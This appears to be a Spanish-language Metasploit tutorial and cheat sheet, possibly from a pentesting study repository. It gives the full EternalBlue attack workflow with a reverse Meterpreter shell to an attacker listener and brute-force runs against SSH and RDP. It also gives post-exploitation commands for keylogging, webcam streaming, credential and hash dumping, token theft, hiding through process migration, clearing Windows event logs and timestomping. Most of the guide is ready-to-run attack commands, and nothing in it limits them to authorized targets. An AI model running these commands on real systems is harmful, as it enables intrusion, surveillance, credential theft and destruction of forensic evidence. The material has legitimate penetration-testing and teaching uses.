# Metasploit Framework — Guía Completa

> **Metasploit** es el framework de explotación más utilizado en el mundo. Es open source, mantenido por Rapid7, y viene preinstalado en Kali Linux. Permite buscar, configurar y lanzar exploits, gestionar sesiones y realizar post-explotación.

---

## Tabla de contenidos

1. [¿Qué es Metasploit?](#1-qué-es-metasploit)
2. [Arquitectura y componentes](#2-arquitectura-y-componentes)
3. [Primeros pasos con msfconsole](#3-primeros-pasos-con-msfconsole)
4. [Tipos de módulos](#4-tipos-de-módulos)
5. [Flujo de trabajo estándar](#5-flujo-de-trabajo-estándar)
6. [Meterpreter — la sesión avanzada](#6-meterpreter--la-sesión-avanzada)
7. [Gestión de sesiones](#7-gestión-de-sesiones)
8. [Base de datos y workspaces](#8-base-de-datos-y-workspaces)
9. [Módulos auxiliares útiles](#9-módulos-auxiliares-útiles)
10. [Cheat Sheet](#10-cheat-sheet)

---

## 1. ¿Qué es Metasploit?

Metasploit es una plataforma que integra en un solo lugar:

- Una **base de datos de exploits** (más de 2.000 módulos)
- Un **motor de payloads** para generar y gestionar cargas útiles
- Una **consola interactiva** (msfconsole) para orquestarlo todo
- Un sistema de **post-explotación** con Meterpreter

### Ediciones

| Edición | Descripción |
|---------|-------------|
| **Framework (OSS)** | Gratuito, open source, interfaz CLI. Lo que usamos en este repo |
| **Community** | Gratuita con interfaz web básica |
| **Pro** | De pago, con automatización, reporting y más |

---

## 2. Arquitectura y componentes

```
┌─────────────────────────────────────────────────────────┐
│                   METASPLOIT FRAMEWORK                  │
│                                                         │
│  msfconsole ──► Interfaz principal de usuario          │
│  msfvenom   ──► Generador de payloads standalone       │
│  msfdb      ──► Base de datos PostgreSQL               │
│  msfrpcd    ──► Servidor RPC (para automatización)     │
│                                                         │
│  Módulos:                                               │
│  ┌──────────┬──────────┬──────────┬──────────────────┐ │
│  │ exploits │ payloads │auxiliary │ post             │ │
│  │ encoders │   nops   │ evasion  │ (post-explot.)   │ │
│  └──────────┴──────────┴──────────┴──────────────────┘ │
└─────────────────────────────────────────────────────────┘
```

### Rutas importantes en Kali Linux

```bash
/usr/share/metasploit-framework/       # Raíz del framework
/usr/share/metasploit-framework/modules/exploits/    # Exploits
/usr/share/metasploit-framework/modules/payloads/    # Payloads
/usr/share/metasploit-framework/modules/auxiliary/   # Auxiliares
/usr/share/metasploit-framework/modules/post/        # Post-explotación
~/.msf4/                               # Configuración del usuario
~/.msf4/logs/                          # Logs de sesiones
```

---

## 3. Primeros pasos con msfconsole

### Iniciar Metasploit

```bash
# Iniciar la base de datos (necesario la primera vez)
sudo msfdb init

# Lanzar msfconsole
msfconsole

# Lanzar en modo silencioso (sin banner)
msfconsole -q

# Lanzar y ejecutar un script .rc al inicio
msfconsole -r mi_script.rc
```

### Comandos básicos de navegación

```bash
# Ayuda general
msf > help

# Ayuda de un comando específico
msf > help search
msf > help use

# Limpiar pantalla
msf > clear

# Ver la versión
msf > version

# Salir
msf > exit
```

---

## 4. Tipos de módulos

### Exploits

Los exploits son el núcleo de Metasploit. Cada uno ataca una vulnerabilidad específica en un servicio o aplicación.

```bash
# Buscar exploits
msf > search type:exploit platform:windows smb
msf > search eternalblue
msf > search cve:2021-44228
msf > search name:ms17_010

# Ver información detallada de un módulo
msf > info exploit/windows/smb/ms17_010_eternalblue
```

**Ranking de fiabilidad de exploits:**

| Rank | Descripción |
|------|-------------|
| `excellent` | Nunca crashea el servicio, casi 100% de éxito |
| `great` | Tiene detección automática del objetivo |
| `good` | Funciona en la mayoría de configuraciones |
| `normal` | Funcional pero puede requerir ajustes |
| `average` | Funciona en condiciones muy específicas |
| `low` | Raro que funcione |
| `manual` | Requiere configuración muy específica |

---

### Módulos Auxiliary

No explotan directamente, sirven para escaneo, fuzzing, sniffing y brute-force.

```bash
# Buscar auxiliares
msf > search type:auxiliary scanner smb
msf > search type:auxiliary brute ssh

# Ejemplos útiles
use auxiliary/scanner/smb/smb_ms17_010     # Detectar EternalBlue
use auxiliary/scanner/portscan/tcp         # Escaneo de puertos
use auxiliary/scanner/ssh/ssh_login        # Brute force SSH
use auxiliary/scanner/http/dir_scanner     # Descubrimiento de directorios web
use auxiliary/sniffer/psnuffle             # Sniffar credenciales en red
```

---

### Módulos Post

Para acciones después de obtener la sesión Meterpreter.

```bash
# Desde una sesión Meterpreter activa
meterpreter > run post/multi/recon/local_exploit_suggester     # Sugerir escaladas locales
meterpreter > run post/windows/gather/enum_applications         # Listar apps instaladas
meterpreter > run post/windows/gather/credentials/credential_collector
meterpreter > run post/windows/manage/enable_rdp               # Habilitar RDP
meterpreter > run post/windows/gather/dump_hashes              # Extraer hashes NTLM
meterpreter > run post/multi/manage/shell_to_meterpreter       # Convertir shell a Meterpreter
```

---

## 5. Flujo de trabajo estándar

Este es el flujo que se sigue en cualquier explotación con Metasploit:

### Paso 1: Buscar el exploit

```bash
msf > search ms17_010
msf > search type:exploit name:eternal
```

### Paso 2: Seleccionar el módulo

```bash
msf > use exploit/windows/smb/ms17_010_eternalblue
# O usando el número del resultado de search:
msf > use 0
```

### Paso 3: Ver información y opciones requeridas

```bash
msf exploit(ms17_010_eternalblue) > info
msf exploit(ms17_010_eternalblue) > show options

# Opciones típicas:
# RHOSTS  → IP del objetivo (required)
# RPORT   → Puerto del servicio (suele tener valor por defecto)
# LHOST   → Tu IP (para el payload reverse)
# LPORT   → Tu puerto de escucha
```

### Paso 4: Seleccionar el payload

```bash
# Ver payloads compatibles con este exploit
msf exploit(ms17_010_eternalblue) > show payloads

# Seleccionar un payload
msf exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
```

### Paso 5: Configurar las opciones

```bash
msf exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.41
msf exploit(ms17_010_eternalblue) > set LHOST 192.168.1.35
msf exploit(ms17_010_eternalblue) > set LPORT 4444

# Opciones globales (persisten entre módulos)
msf > setg LHOST 192.168.1.35
msf > setg LPORT 4444

# Verificar la configuración
msf exploit(ms17_010_eternalblue) > show options
```

### Paso 6: Verificar si el objetivo es vulnerable (opcional)

```bash
msf exploit(ms17_010_eternalblue) > check
# [+] 192.168.1.41:445 - The target is vulnerable.
# [-] 192.168.1.41:445 - The target is not vulnerable.
```

### Paso 7: Lanzar el exploit

```bash
# Lanzar y esperar (bloquea la consola)
msf exploit(ms17_010_eternalblue) > run
msf exploit(ms17_010_eternalblue) > exploit

# Lanzar en segundo plano (no bloquea)
msf exploit(ms17_010_eternalblue) > run -j
msf exploit(ms17_010_eternalblue) > exploit -j
```

---

## 6. Meterpreter — la sesión avanzada

Meterpreter es el payload más potente de Metasploit. A diferencia de una shell básica, Meterpreter:

- Se ejecuta **completamente en memoria** (sin escribir en disco)
- **Cifra las comunicaciones** con TLS
- Permite **migrar entre procesos** para ocultarse
- Soporta **extensiones dinámicas** (kiwi, incognito, etc.)
- Proporciona **comandos avanzados** para post-explotación

### Comandos del sistema

```bash
# Información del sistema
meterpreter > sysinfo           # SO, hostname, arquitectura, idioma
meterpreter > getuid            # Usuario actual
meterpreter > getpid            # PID del proceso de Meterpreter
meterpreter > getprivs          # Privilegios del proceso actual

# Procesos
meterpreter > ps                # Listar procesos activos
meterpreter > kill 1234         # Matar proceso con PID 1234

# Migración de proceso
meterpreter > migrate 5816      # Migrar al PID indicado (ej: explorer.exe)
# → Útil para ocultarse en un proceso legítimo

# Shell del sistema
meterpreter > shell             # Abrir cmd.exe / bash
# (Ctrl+Z para volver a Meterpreter sin cerrar la shell)
```

### Comandos de sistema de archivos

```bash
# Navegación
meterpreter > pwd               # Directorio actual (en el objetivo)
meterpreter > ls                # Listar contenido
meterpreter > cd C:\\Users      # Cambiar directorio
meterpreter > search -f *.txt -d C:\\Users    # Buscar archivos

# Transferencia de archivos
meterpreter > download "C:\\Users\\user\\Desktop\\secreto.txt" /root/
meterpreter > upload /root/herramienta.exe "C:\\Windows\\Temp\\"

# Manipulación de archivos
meterpreter > cat "C:\\archivo.txt"     # Ver contenido
meterpreter > edit "C:\\archivo.txt"    # Editar con vim
meterpreter > rm "C:\\archivo.txt"      # Eliminar archivo
meterpreter > mkdir "C:\\nueva_carpeta" # Crear directorio
```

### Comandos de red

```bash
# Información de red del objetivo
meterpreter > ipconfig          # Interfaces y IPs (Windows)
meterpreter > ifconfig          # Interfaces y IPs (Linux)
meterpreter > arp               # Tabla ARP (otros hosts en la red)
meterpreter > netstat           # Conexiones activas y puertos
meterpreter > route             # Tabla de rutas

# Port Forwarding (pivotar hacia redes internas)
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.2.10
# → Redirige 127.0.0.1:3389 local hacia 192.168.2.10:3389 a través del objetivo
```

### Comandos de escalada y evasión

```bash
# Escalada de privilegios
meterpreter > getsystem
# Intenta varias técnicas para obtener SYSTEM:
# Técnica 1: Named Pipe Impersonation (In Memory/Admin)
# Técnica 2: Named Pipe Impersonation (Dropper/Admin)
# Técnica 3: Token Duplication (In Memory/Admin)
# Técnica 4: Named Pipe Impersonation (RPCSS)

# Evasión
meterpreter > clearev           # Borrar logs de Windows (Application, System, Security)
meterpreter > timestomp "C:\\archivo.exe" -m "01/01/2020 00:00:00"
# → Modificar timestamps del archivo para dificultar análisis forense

# Token de usuario
meterpreter > steal_token 1234  # Robar token de un proceso
meterpreter > rev2self          # Volver al token original

# Captura de información
meterpreter > screenshot        # Captura de pantalla
meterpreter > keyscan_start     # Iniciar keylogger
meterpreter > keyscan_dump      # Volcar las teclas capturadas
meterpreter > keyscan_stop      # Detener keylogger
meterpreter > webcam_list       # Listar cámaras web
meterpreter > webcam_stream     # Streaming de cámara en tiempo real
```

### Extensiones de Meterpreter

```bash
# Cargar extensiones adicionales
meterpreter > load kiwi         # Mimikatz integrado
meterpreter > load incognito    # Manipulación de tokens de Windows
meterpreter > load powershell   # Integración con PowerShell

# Con kiwi cargado:
meterpreter > creds_all         # Extraer todas las credenciales
meterpreter > lsa_dump_sam      # Extraer hashes del SAM
meterpreter > lsa_dump_secrets  # Extraer secretos del LSA
```

---

## 7. Gestión de sesiones

```bash
# Listar sesiones activas
msf > sessions
msf > sessions -l

# Interactuar con una sesión
msf > sessions -i 1            # Abrir sesión 1

# Poner sesión en segundo plano (desde dentro de Meterpreter)
meterpreter > background       # Ctrl+Z

# Matar una sesión
msf > sessions -k 1            # Matar sesión 1
msf > sessions -K              # Matar TODAS las sesiones

# Listar sesiones con detalles
msf > sessions -v

# Ejecutar un comando en todas las sesiones a la vez
msf > sessions -c "sysinfo"

# Actualizar una shell básica a Meterpreter
msf > sessions -u 1
```

### Handler multi/handler

Para recibir conexiones inversas cuando el payload ya está ejecutado en el objetivo:

```bash
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.35
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > run -j    # En segundo plano para recibir múltiples sesiones
```

---

## 8. Base de datos y workspaces

La base de datos PostgreSQL de Metasploit permite guardar resultados de escaneos y organizar auditorías por proyecto.

```bash
# Inicializar la BD
sudo msfdb init
sudo msfdb start

# Verificar conexión desde msfconsole
msf > db_status

# Workspaces (proyectos separados)
msf > workspace           # Ver workspaces
msf > workspace -a empresa_auditada    # Crear nuevo workspace
msf > workspace empresa_auditada       # Cambiar de workspace

# Importar resultados de Nmap directamente a la BD
msf > db_nmap -sV -sC -O -Pn 192.168.1.0/24

# Consultar hosts descubiertos
msf > hosts
msf > hosts -c address,os_name,os_flavor    # Columnas específicas

# Consultar servicios descubiertos
msf > services
msf > services -p 445,80,22    # Filtrar por puerto

# Consultar vulnerabilidades registradas
msf > vulns

# Exportar datos
msf > db_export -f xml /root/auditoria.xml
```

---

## 9. Módulos auxiliares útiles

### Escaneo y enumeración

```bash
# Escaneo de puertos TCP
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389
run

# Detectar EternalBlue (MS17-010)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Enumeración SMB
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers

# Enumeración de directorios web
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.41
set RPORT 80
run

# Detectar login sin contraseña en VNC
use auxiliary/scanner/vnc/vnc_none_auth
```

### Brute Force

```bash
# SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.41
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run

# RDP
use auxiliary/scanner/rdp/rdp_login
set RHOSTS 192.168.1.41
set USERNAME administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## 10. Cheat Sheet

```
══════════════════════════════════════════════════════════════
               METASPLOIT FRAMEWORK CHEAT SHEET
══════════════════════════════════════════════════════════════

INICIAR
  msfconsole                    Consola principal
  msfconsole -q                 Sin banner
  msfconsole -r script.rc       Ejecutar script al inicio
  sudo msfdb init               Inicializar BD

BUSCAR MÓDULOS
  search <término>              Buscar módulos
  search type:exploit smb       Filtrar por tipo y keyword
  search cve:2021-44228         Buscar por CVE
  info <módulo>                 Detalles del módulo

USAR UN MÓDULO
  use <módulo>                  Cargar módulo
  show options                  Ver opciones configurables
  show payloads                 Ver payloads compatibles
  set <OPCIÓN> <valor>          Configurar opción
  setg <OPCIÓN> <valor>         Configurar opción global
  unset <OPCIÓN>                Borrar opción
  check                         Verificar si objetivo es vulnerable
  run / exploit                 Lanzar
  run -j                        Lanzar en segundo plano

SESIONES
  sessions -l                   Listar sesiones
  sessions -i <N>               Interactuar con sesión N
  sessions -k <N>               Matar sesión N
  sessions -K                   Matar todas
  background / Ctrl+Z           Poner sesión en segundo plano

METERPRETER — SISTEMA
  sysinfo                       Info del sistema
  getuid                        Usuario actual
  getpid                        PID del proceso
  getprivs                      Privilegios
  getsystem                     Intentar escalar a SYSTEM
  ps                            Lista de procesos
  migrate <PID>                 Migrar a otro proceso
  shell                         Abrir shell del SO

METERPRETER — ARCHIVOS
  pwd / ls / cd                 Navegación
  download <ruta_remota>        Descargar archivo
  upload <ruta_local> <remota>  Subir archivo
  cat <archivo>                 Ver contenido
  search -f *.txt               Buscar archivos

METERPRETER — POST-EXPLOT.
  clearev                       Borrar logs de Windows
  screenshot                    Captura de pantalla
  keyscan_start / dump / stop   Keylogger
  webcam_stream                 Cámara en tiempo real
  load kiwi → creds_all         Extraer credenciales

BASE DE DATOS
  db_status                     Estado de la BD
  workspace -a <nombre>         Crear workspace
  db_nmap <opciones> <IP>       Nmap → BD directamente
  hosts / services / vulns      Consultar datos guardados

══════════════════════════════════════════════════════════════
```

---

## Referencias

- [Documentación oficial de Metasploit](https://docs.metasploit.com/)
- [Metasploit Unleashed (Offensive Security)](https://www.offsec.com/metasploit-unleashed/)
- [MITRE ATT&CK — Metasploit como herramienta](https://attack.mitre.org/software/S0521/)
